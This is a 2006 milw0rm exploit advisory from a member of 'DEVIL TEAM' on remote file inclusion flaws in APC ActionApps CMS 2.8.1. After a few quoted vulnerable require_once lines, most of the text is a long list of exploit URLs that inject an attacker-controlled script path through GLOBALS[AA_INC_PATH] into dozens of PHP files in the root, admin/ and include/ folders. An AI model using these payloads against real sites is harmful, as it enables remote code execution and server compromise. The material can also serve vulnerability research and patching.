@@ -1,0 +1,183 @@
+################ DEVIL TEAM THE BEST POLISH TEAM #################
+#APC ActionApps CMS (2.8.1) - Remote File Include Vulnerabilities
+#Find by Kacper (Rahim).
+#Greetings For ALL DEVIL TEAM members, Special DragonHeart :***
+#Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl
+#site: http://sourceforge.net/projects/apc-aa/
+##################################################################
+/*
+cached.php3:
+... (line:35)
+require_once $GLOBALS['AA_INC_PATH']."locsess.php3";
+...
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+cron.php3:
+... (line:47)
+require_once $GLOBALS['AA_INC_PATH']."locsess.php3";
+...
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+discussion.php3:
+... (line:80)
+require_once $GLOBALS['AA_INC_PATH']."easy_scroller.php3";
+...
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+filldisc.php3:
+... (line:75)
+require_once $GLOBALS['AA_INC_PATH']."locsess.php3";
+...
+
+And more.......... ;-)
+
+*/
+
+expl:
+
+http://www.site.com/[APC_path]/cached.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/cron.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/discussion.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/filldisc.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/filler.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/fillform.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/go.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+http://www.site.com/[APC_path]/hiercons.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/jsview.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/live_checkbox.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/offline.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/post2shtml.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/search.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/slice.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/sql_update.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/view.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+
+/*
+In Admin/ folder all files have:
+
+require_once "include/config.php3";
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+include/config.php3: on line 79
+
+require_once $GLOBALS['AA_INC_PATH']."mgettext.php3";
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+only this file: logout.php3, prev_navigation.php3, preview.php3, dont
+have this verbilities
+
+All can expl:
+
+
+http://www.site.com/[APC_path]/admin/[any_file]?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+
+*/
+in includes/ folder:
+
+
+http://www.site.com/[APC_path]/include/auth.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/constants.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/csn_util.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/discussion.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/event.class.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/event_handler.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/extauth.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/extauthnobody.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/feeding.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/fileman.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/formutil.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/item.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/item_content.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/itemfunc.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/itemview.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/javascript.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/mail.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/mailman.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/menu.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/notify.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/pagecache.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/perm_sql.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/profile.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/searchbar.class.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/searchlib.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/slicedit.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/sliceobj.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/slicewiz.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/stringexpand.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/tabledit.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/tabledit_util.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/tv_email.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/tv_misc.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/um_uedit.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/um_util.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/view.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/xml_fetch.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/xml_rssparse.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+http://www.site.com/[APC_path]/include/zids.php3?GLOBALS[AA_INC_PATH]=[evil_scripts]
+
+
+/*
+and more verbs in modules/ folder :)
+*/
+
+###################################################################
+#Elo ;-)
+
+# milw0rm.com [2006-05-25]
